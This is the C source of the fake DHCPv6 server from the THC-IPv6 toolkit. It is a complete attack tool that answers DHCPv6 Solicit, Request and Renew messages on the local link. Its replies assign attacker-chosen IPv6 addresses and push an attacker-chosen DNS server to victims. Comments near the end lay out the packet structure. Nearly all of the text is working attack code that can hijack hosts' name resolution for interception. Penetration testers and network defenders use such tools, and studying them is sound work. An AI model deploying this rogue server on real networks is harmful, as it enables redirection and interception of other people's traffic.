#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <time.h>
#include <pcap.h>
#include <netinet/in.h>
#include <sys/select.h>
#include "thc-ipv6.h"

void help(char *prg) {
  printf("%s %s (c) 2020 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
  printf(
      "Syntax: %s interface network-address/prefix-length dns-server "
      "[dhcp-server-ip-address [mac-address]]\n\n",
      prg);
  printf(
      "Fake DHCPv6 server. Use to configure an address and set a DNS server\n");
  exit(-1);
}

int main(int argc, char *argv[]) {
  char *         routerip, *interface, mac[16] = "";
  char           rdatabuf[1024], wdatabuf[1024], cmsgbuf[1024], mybuf[1024];
  unsigned char *routerip6, *mac6 = mac, *ip6, *ptr, *ptr1, *ptr2, *ptr3;
  unsigned char *dns;
  int size, fromlen = 0, /*mtu = 1500, */ i, j, k, l, m, s, len, t, mlen,
            csize = 0;
  static struct iovec     iov;
  struct sockaddr_storage from;
  struct msghdr           mhdr;
  struct sockaddr_in6     ddst;
  unsigned long long int  count = 0;

  if (argc < 3 || strncmp(argv[1], "-h", 2) == 0) help(argv[0]);

  if (getenv("THC_IPV6_PPPOE") != NULL || getenv("THC_IPV6_6IN4") != NULL)
    printf("WARNING: %s is not working with injection!\n", argv[0]);

  if (strcmp(argv[1], "-r") == 0) {  // is ignored
    argv++;
    argc--;
  }

  memset(mac, 0, sizeof(mac));
  interface = argv[1];
  if (thc_get_own_mac(interface) == NULL) {
    fprintf(stderr, "Error: invalid interface %s\n", interface);
    exit(-1);
  }
  if (argc >= 6 && (ptr = argv[5]) != NULL)
    sscanf(ptr, "%x:%x:%x:%x:%x:%x", (unsigned int *)&mac[0],
           (unsigned int *)&mac[1], (unsigned int *)&mac[2],
           (unsigned int *)&mac[3], (unsigned int *)&mac[4],
           (unsigned int *)&mac[5]);
  else
    mac6 = thc_get_own_mac(interface);

  if (argc >= 5 && argv[4] != NULL)
    ip6 = thc_resolve6(argv[4]);
  else
    ip6 = thc_get_own_ipv6(interface, NULL, PREFER_LINK);

  if (argc >= 4 && argv[3] != NULL)
    dns = thc_resolve6(argv[3]);
  else
    dns = thc_resolve6("ff02::fb");

  routerip = argv[2];
  if ((ptr = index(routerip, '/')) == NULL) {
    printf(
        "Error: Option must be supplied as IP-ADDRESS/PREFIXLENGTH, e.g. "
        "ff80::01/16\n");
    exit(-1);
  }
  *ptr++ = 0;
  size = atoi(ptr);

  routerip6 = thc_resolve6(routerip);

  if (routerip6 == NULL || size < 1 || size > 128) {
    fprintf(stderr, "Error: IP-ADDRESS/PREFIXLENGTH argument is invalid: %s\n",
            argv[2]);
    exit(-1);
  }
  if (size < 64) {
    fprintf(
        stderr,
        "Warning: network prefix must be a minimum of /64, resizing to /64\n");
    size = 64;
  }
  if (size % 8 > 0) {
    size = ((size / 8) + 1) * 8;
    fprintf(stderr,
            "Warning: prefix must be a multiple of 8, resizing to /%d\n",
            csize * 8);
  }
  csize = 8 - ((size - 64) / 8);
  if (dns == NULL) {
    fprintf(stderr, "Error: dns argument is invalid: %s\n", argv[3]);
    exit(-1);
  }
  if (ip6 == NULL) {
    fprintf(stderr, "Error: link-local-ip6 argument is invalid: %s\n", argv[4]);
    exit(-1);
  }

  /*
    if (mtu < 1 || mtu > 65536) {
      fprintf(stderr, "Error: mtu argument is invalid: %s\n", argv[5]);
      exit(-1);
    }
    if (mtu < 1228 || mtu > 1500)
      fprintf(stderr, "Warning: unusual mtu size defined, be sure what you are
    doing :%d\n", mtu);
  */
  if (mac6 == NULL) {
    fprintf(stderr, "Error: mac address in invalid\n");
    exit(-1);
  }

  if ((s = thc_bind_udp_port(547)) < 0) {
    fprintf(stderr, "Error: could not bind to 547/udp\n");
    exit(-1);
  }
  if (thc_bind_multicast_to_socket(s, interface, thc_resolve6("ff02::1:2")) <
          0 ||
      thc_bind_multicast_to_socket(s, interface, thc_resolve6("ff02::1:3")) <
          0) {
    fprintf(stderr, "Error: could not bind multicast address\n");
    exit(-1);
  }
  if ((t = socket(AF_INET6, SOCK_DGRAM, 0)) < 0) {
    perror("Error:");
    exit(-1);
  }

  memset(mybuf, 0, sizeof(mybuf));
  mybuf[1] = 2;
  mybuf[3] = 14;
  mybuf[5] = 1;
  mybuf[7] = 1;
  // mybuf + 8 == time
  memcpy(mybuf + 12, mac6, 6);
  mlen = 18;
  mybuf[mlen + 1] = 23;
  mybuf[mlen + 3] = 16;
  memcpy(mybuf + mlen + 4, dns, 16);
  mlen += 20;

  printf(
      "Starting to fake dhcp6 server on %s for %s (Press Control-C to end) "
      "...\n\n",
      interface, argv[2]);
  while (1) {
    memset((char *)&from, 0, sizeof(from));
    memset(&iov, 0, sizeof(iov));
    memset(&mhdr, 0, sizeof(mhdr));
    iov.iov_base = rdatabuf;
    iov.iov_len = sizeof(rdatabuf);
    mhdr.msg_name = &from;
    mhdr.msg_namelen = sizeof(from);
    mhdr.msg_iov = &iov;
    mhdr.msg_iovlen = 1;
    mhdr.msg_control = (caddr_t)cmsgbuf;
    mhdr.msg_controllen = sizeof(cmsgbuf);
    if ((len = recvmsg(s, &mhdr, 0)) > 0) {
      fromlen = mhdr.msg_namelen;
      if (debug) thc_dump_data(rdatabuf, len, "Received Packet");
      ddst.sin6_addr = ((struct sockaddr_in6 *)mhdr.msg_name)->sin6_addr;
      ptr2 = thc_ipv62notation((char *)&ddst.sin6_addr);
      switch (rdatabuf[0]) {
        case 1:
          ptr1 = "Solicitate";
          break;
        case 2:
          ptr1 = "Advertise (illegal, ignored)";
          break;
        case 3:
          ptr1 = "Request";
          break;
        case 4:
          ptr1 = "Confirm";
          break;
        case 5:
          ptr1 = "Renew";
          break;
        case 6:
          ptr1 = "Rebind";
          break;
        case 7:
          ptr1 = "Reply (illegal, ignored)";
          break;
        case 8:
          ptr1 = "Release (ignored)";
          break;
        case 9:
          ptr1 = "Decline (ignored)";
          break;
        case 10:
          ptr1 = "Reconfigure (illegal, ignored)";
          break;
        case 11:
          ptr1 = "Information Request (ignored)";
          break;
        case 12:
          ptr1 = "Relay Forward (ignored)";
          break;
        case 13:
          ptr1 = "Relay Reply (ignored)";
          break;
        default:
          ptr1 = "Unknown (ignored)";
          break;
      }
      printf("Received DHCP6 %s packet from %s\n", ptr1, ptr2);
      free(ptr2);
      if (rdatabuf[0] >= 1 && rdatabuf[0] < 7 && rdatabuf[0] != 2) {
        memset(wdatabuf, 0, sizeof(wdatabuf));
        memcpy(wdatabuf + 1, rdatabuf + 1, 3);
        i = j = 4;
        k = -1;
        if (rdatabuf[0] == 1) {  // initial request
          wdatabuf[0] = 2;
          while ((j + 4) < len) {
            l = rdatabuf[j + 2] * 256 + rdatabuf[j + 3];
            if (l + j + 4 > len) {
              l = 0;
              j = len;
              printf("Info: received evil packet\n");
            } else {
              if (rdatabuf[j + 1] == 1) {
                memcpy(wdatabuf + i, rdatabuf + j, l + 4);
                i += l + 4;
              } else if (rdatabuf[j + 1] == 3) {
                k = j;  // just set a pointer
              }
              j += l + 4;
            }
          }
          // add 02, 23
          j = time(NULL);
          memcpy(mybuf + 8, (char *)&j + _TAKE4, 4);
          memcpy(wdatabuf + i, mybuf, mlen);
          i += mlen;
          // now expand 3
          if (k > -1 && rdatabuf[k + 3] == 12 &&
              rdatabuf[k + 2] == 0) {  // copy structure
            memcpy(wdatabuf + i, rdatabuf + k, 16);
          } else {  // or create new
            wdatabuf[i + 1] = 3;
            memcpy(wdatabuf + i + 4, (char *)&j + _TAKE4,
                   4);  // copy time as IAID
          }
          wdatabuf[i + 3] = 40;
          memset(wdatabuf + i + 8, 0, 8);
          wdatabuf[i + 10] = 0x7f;
          wdatabuf[i + 14] = 0xfe;
          i += 16;
          wdatabuf[i + 1] = 5;
          wdatabuf[i + 3] = 24;
          memcpy(wdatabuf + i + 4, routerip6, 16);  // address
          count++;
          if (csize > 0)
            memcpy(wdatabuf + i + 4 + 16 - csize, (char *)&count,
                   csize);  // counter
          ptr3 = thc_ipv62notation(wdatabuf + i + 4);
          wdatabuf[i + 21] = 2;
          wdatabuf[i + 25] = 2;
          i += 28;
        } else {
          wdatabuf[0] = 7;
          m = 0;
          while ((j + 4) < len) {
            l = rdatabuf[j + 2] * 256 + rdatabuf[j + 3];
            if (l + j + 4 > len) {
              l = 0;
              j = len;
              printf("Info: received evil packet\n");
            } else {  // just copy types 1-3 and 23
              if ((rdatabuf[j + 1] >= 1 && rdatabuf[j + 1] <= 3) ||
                  rdatabuf[j + 1] == 23) {
                memcpy(wdatabuf + i, rdatabuf + j, l + 4);
                i += l + 4;
                if (rdatabuf[j + 1] == 23) k = 1;
                if (rdatabuf[j + 1] == 3) m = 1;
              }
              j += l + 4;
            }
          }
          if (k == -1) {
            memcpy(wdatabuf + i, mybuf + 18, 20);
            i += 20;
          }
        }
        len = i;
        if (debug) thc_dump_data(wdatabuf, len, "Reply Packet");
        ddst.sin6_family = AF_INET6;
        ddst.sin6_port = htons(546);
        // ddst.sin6_addr = ((struct sockaddr_in6 *)mhdr.msg_name)->sin6_addr;
        ddst.sin6_scope_id =
            ((struct sockaddr_in6 *)mhdr.msg_name)->sin6_scope_id;
        if (sendto(t, wdatabuf, len, 0, (struct sockaddr *)&ddst,
                   sizeof(ddst)) < 0)
          perror("Error:");
        else {
          ptr2 = thc_ipv62notation((char *)&ddst.sin6_addr);
          if (wdatabuf[0] == 2) {
            printf("Sent DHCP6 Advertise packet to %s (offer: %s)\n", ptr2,
                   ptr3);
            free(ptr3);
          } else if (m)
            printf("Sent DHCP6 Reply packet to %s (address accepted)\n", ptr2);
          else
            printf("Sent DHCP6 Reply packet to %s (did not set address)\n",
                   ptr2);
          free(ptr2);
        }
      }
    }
  }

  /*  packet structure:
        1 byte  = type
        3 bytes = sessionid
        while(packet data) {
          2 bytes = type
          2 bytes = length in bytes of following data
          ... defined fixed length data ...
        }

      server listen on ff02::1:2 udp 547
      client connects from linklocal port 546, ttl 1
          01 = solicit
          3 bytes = sessionid
          6 bytes = blog (elapsed, 8)
          8 bytes = 01 blob (client id + time + mac)
          4 bytes = time
          6 bytes = mac
          16 bytes = 03 blob (want perm address)
          5 + length + hostname = hostname
          18 bytes = blob (vendor class, type 16)
          12 bytes = blob (requested options, type 6)
      server sends to linklocal (respect client port), ttl 1
          02 = advertise
          3 bytes = sessionid (copy)
          18 bytes = 01 blob (client copy of client-id)
          8 bytes = 02 blob (server id + time + mac)
          4 bytes = time
          6 bytes = mac
          0003 = give perm address
          2 bytes = length
          4 bytes = IAID (from client request!)
          4 bytes = validity time 1 (1800)
          4 bytes = validity time 2 (2880)
            0005 = address structure
            2 bytes = length (24 bytes)
            16 bytes = address
            4 bytes = validity time (3600)
            4 byte = validity time (same)
          0023 = dns option
          2 bytes = length (16 bytes)
          16 bytes = dns server address
      client sends to ff02::1:2 !
          03 = request
          3 bytes = sessionid
          6 bytes = blog (elapsed, 8)
          8 bytes = 01 blob (client id + time + mac)
          4 bytes = time
          6 bytes = mac
          18 bytes = client (again)
          18 bytes = server (copy)
          44 bytes = address (copy)
          5 + length + hostname = hostname (again)
          18 bytes = blob again (vendor class, type 16)
          12 bytes = blob again (requested options, type 6)
      server replies
          7 = reply
          copy original advertise packet :-)
    */

  return 0;  // never reached
}
